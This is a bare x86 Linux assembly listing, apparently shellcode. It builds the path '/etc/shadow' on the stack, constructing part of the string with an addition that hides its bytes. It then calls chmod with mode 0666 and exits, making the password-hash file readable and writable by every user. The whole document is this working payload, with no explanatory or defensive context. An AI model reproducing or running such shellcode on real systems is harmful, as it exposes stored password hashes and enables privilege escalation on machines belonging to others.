 
 
 
  section .text
 
       global _start
 
  _start:
       xor ecx, ecx
 
       mov al,15 
       push ecx
       push byte 0x77
       mov cx,0x4d42
       add cx,0x2222
       push cx
       push 0x6168732f
       push 0x6374652f
       mov ebx, esp
       push word 0x1b6
       pop ecx
       int 0x80
 
       mov al,1
       int 0x80
 
